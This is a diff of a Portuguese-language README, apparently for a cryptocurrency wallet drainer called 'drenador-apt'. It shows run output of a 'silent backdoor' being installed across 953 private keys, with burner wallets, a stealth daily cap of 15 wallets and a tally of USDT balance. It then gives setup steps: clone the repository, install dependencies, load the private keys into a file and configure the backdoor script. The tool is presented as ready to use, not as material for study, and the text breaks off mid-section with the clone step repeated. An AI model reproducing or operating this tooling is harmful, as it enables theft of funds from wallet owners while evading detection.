@@ -103,34 +103,54 @@
 
 **BACKDOOR SILENCIOSO**
 ================================================================================
-📦 Contrato Mestre: 0x7a2f...b3c8
-🔥 Wallets Burner: 20 (1 por grupo de 50)
-💎 RPC Premium: 2 endpoints (GetBlock - TRANSAÇÕES)
-🌐 RPC Público: 10 endpoints (CONSULTAS)
-🎯 META DIÁRIA: 15 wallets (MODO GOTEJAMENTO)
+### Execução de implantação
+- 📦 Contrato Mestre: `0x7a2f...b3c8`
+- 🔥 Wallets Burner: 20 (1 por grupo de 50)
+- 💎 RPC Premium: 2 endpoints (GetBlock - TRANSAÇÕES)
+- 🌐 RPC Público: 10 endpoints (CONSULTAS)
+- 🎯 Meta diária: 15 wallets (modo gotejamento)
 
-📌 Checkpoint carregado: 127 wallets já processadas
-📊 Total de chaves: 953
-📊 Válidas: 953
-📊 Já instaladas: 127
-📊 Pendentes: 826
+### Checkpoint atual
+- 📌 Checkpoint carregado: 127 wallets processadas
+- 📊 Total de chaves: 953
+- 📊 Válidas: 953
+- 📊 Já instaladas: 127
+- 📊 Pendentes: 826
 
 **🔧 Instalando backdoor em 826 chaves restantes...**
 
 📈 [15/826] 1.8% | Hoje: 15/15 | Vel: 12.5 wallets/min | ETA: 64.8 min | ✅ 154 | ❌ 0 | 💰 saldo: 1110USDT
 
-**🎯 META DIÁRIA DE 15 ATINGIDA! Parando execução para manter o stealth.**
+**🎯 Meta diária de 15 atingida! Parando execução para manter o stealth.**
 
-🔧 INSTALAÇÃO (AMBIENTE CONTROLADO)
+## 🔧 INSTALAÇÃO (AMBIENTE CONTROLADO)
 
-PRÉ-REQUISITOS
-bash
-Node.js 18.x
-NPM 9.x
-Acesso RPC Premium (GetBlock recomendado)
-953 chaves privadas (geradas offline)
-20 wallets burner (endereços limpos)
-CONFIGURAÇÃO
+### Pré-requisitos
+- bash
+- Node.js 18.x
+- NPM 9.x
+- Acesso RPC Premium (GetBlock recomendado)
+- 953 chaves privadas (geradas offline)
+- 20 wallets burner (endereços limpos)
+
+### Configuração
+1. Clone o repositório
+```bash
+git clone https://github.com/drenator-adversarial-mev-bot/drenador-apt.git
+cd drenador-apt
+```
+2. Instale dependências
+```bash
+npm install
+```
+3. Configure as chaves
+```bash
+echo "0xchave1\n0xchave2\n..." > chaves_953.txt
+```
+4. Configure burners no arquivo de configuração
+```bash
+nano sniper_passo3_backdoor.js
+```
 
 # Clone o repositório
 git clone https://github.com/drenator-adversarial-mev-bot/drenador-apt.git
